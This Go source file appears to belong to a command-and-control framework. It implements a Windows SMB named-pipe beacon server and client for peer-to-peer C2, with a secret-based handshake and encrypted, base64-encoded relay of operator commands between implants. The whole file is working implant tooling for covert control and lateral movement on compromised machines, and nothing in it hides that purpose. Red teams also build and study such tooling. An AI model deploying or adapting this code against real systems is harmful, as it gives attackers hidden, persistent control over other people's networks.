//go:build windows && !linux
// +build windows,!linux

package main

import (
	"bufio"
	b64 "encoding/base64"
	"errors"
	"fmt"
	"log"
	"math/rand"
	"net"
	"strings"
	"time"

	"gopkg.in/natefinch/npipe.v2"
)

// https://posts.specterops.io/designing-peer-to-peer-command-and-control-ad2c61740456

func (server BeaconSmbServer) start() {
	for range time.Tick(time.Millisecond * time.Duration(msPerUpdate)) {
		time.Sleep(time.Second * 2)
		ln, err := npipe.Listen(fmt.Sprintf("\\\\.\\pipe\\%s", pipeName))

		if err != nil {
			fmt.Println(err)
			ln.Close()
			continue
		}

		var conn net.Conn

		for range time.Tick(time.Millisecond * time.Duration(msPerUpdate)) {
			log.Println("Wait for client...")
			conn, err := ln.Accept()

			if err != nil {
				log.Println(err.Error())
				ln.Close()
				continue
			}

			log.Println("Agent connected")
			r := bufio.NewReader(conn)
			out, err := r.ReadString('\n')
			fmt.Println(out)

			if err != nil {
				ln.Close()
				conn.Close()
				continue
			}

			outBytes, err := b64.StdEncoding.DecodeString(out)

			if err != nil {
				ln.Close()
				conn.Close()
				continue
			}

			outDec := securityContext.decrypt(outBytes)
			outSplit := strings.Split(outDec, " ")

			if server.initialized && len(outSplit) == 2 && outSplit[0] == "cmd" {
				decoded, _ := b64.StdEncoding.DecodeString(outSplit[1])
				handleQueryResponse(decoded)
			} else if !server.initialized && (len(outSplit) == 4 || (len(outSplit) == 5 && outSplit[4] == "update")) && outSplit[0] == "auth" && outSplit[1] == cmdProxyId && outSplit[2] == cmdProxyIp {
				fmt.Println("Handshake secret: " + outSplit[3])
				secretEnc := securityContext.encrypt([]byte(outSplit[3]))
				secretEncoded := b64.StdEncoding.EncodeToString(secretEnc)
				fmt.Fprintf(conn, secretEncoded+"\n")
				fmt.Println("sent secret back")
				out, err = r.ReadString('\n')

				if err != nil {
					ln.Close()
					conn.Close()
					continue
				}

				outBytes, err = b64.StdEncoding.DecodeString(out)

				if err != nil {
					ln.Close()
					conn.Close()
					continue
				}

				outDec = securityContext.decrypt(outBytes)
				outSplit = strings.Split(outDec, " ")
				if len(outSplit) == 2 && outSplit[0] == "auth" && outSplit[1] == "true" {
					fmt.Println("Handshake completed")
					fmt.Fprintf(conn, string(server.data)+"\n")
					server.initialized = true
				}
			}

			if out == "close" {
				ln.Close()
				conn.Close()
				break
			}

			conn.Close()
		}

		ln.Close()
		conn.Close()
	}
}

func (client BeaconSmbClient) queryServer()          {} // unused
func (client BeaconSmbClient) upload(string)         {}
func (client BeaconSmbClient) download(string)       {}
func (client BeaconSmbClient) addProxyClient(Beacon) {}
func (client BeaconSmbClient) exitHandler()          {}

func (client BeaconSmbClient) sendMessage(conn net.Conn, msg string) (string, error) {
	msgEnc := securityContext.encrypt([]byte(msg))
	msgEncoded := b64.StdEncoding.EncodeToString(msgEnc)

	if _, err := fmt.Fprintln(conn, msgEncoded); err != nil {
		return "", err
	}

	r := bufio.NewReader(conn)
	output, err := r.ReadString('\n')

	if err != nil {
		return "", err
	}

	outEnc, err := b64.StdEncoding.DecodeString(output)

	if err != nil {
		return "", err
	}

	fmt.Println("Sending enc message: ")
	fmt.Println(outEnc)
	outDec := securityContext.decrypt(outEnc)
	return outDec, nil
}

func (client BeaconSmbClient) tryHandshake() error {
	conn, err := npipe.Dial(fmt.Sprintf("\\\\.\\pipe\\%s", pipeName)) // TODO : replace . with correct network name/ip

	if err != nil {
		return err
	}

	secret := genSecret()
	auth := "auth " + id + " " + ip + " " + secret + " update"
	outDec, err := client.sendMessage(conn, auth)

	if err != nil {
		return err
	}

	authResult := "auth"
	fmt.Println("client sent secret: " + outDec)

	if outDec == secret {
		authResult += " true"
	} else {
		authResult += " false"
	}

	beaconIdentity, err := client.sendMessage(conn, authResult)
	msgBuffer = append(msgBuffer, beaconIdentity)

	if outDec != secret {
		return errors.New("Incorrect secret sent by client")
	} else if err != nil {
		return err
	}

	return nil
}

func (client BeaconSmbClient) command(command []byte) {
	conn, err := npipe.Dial(fmt.Sprintf("\\\\.\\pipe\\%s", pipeName)) // TODO : replace . with correct network name/ip

	if err != nil {
		fmt.Println(err.Error())
		return
	}

	msg := "cmd " + b64.StdEncoding.EncodeToString(command)
	out, err := client.sendMessage(conn, msg)

	if err != nil {
		fmt.Println(err.Error())
		return
	}

	msgBuffer = append(msgBuffer, out)
}

func genSecret() string {
	rand.Seed(time.Now().UTC().UnixNano())
	b := make([]byte, 16)
	secretBytes := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

	for i := range b {
		b[i] = secretBytes[rand.Intn(len(secretBytes))]
	}

	return string(b)
}
